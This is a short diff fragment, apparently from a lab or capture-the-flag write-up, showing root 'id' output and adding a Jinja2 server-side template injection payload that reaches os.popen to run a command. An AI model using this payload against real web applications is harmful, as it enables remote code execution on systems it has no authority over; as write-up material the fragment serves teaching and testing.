@@ -243,3 +243,8 @@ uid=0(root) gid=0(root) groups=0(root)
 ```
 
 We are root.
+
+A
+```
+{{''.__class__.__base__.__subclasses__()[141].__init__.__globals__['sys'].modules['os'].popen("id").read()}}
+```
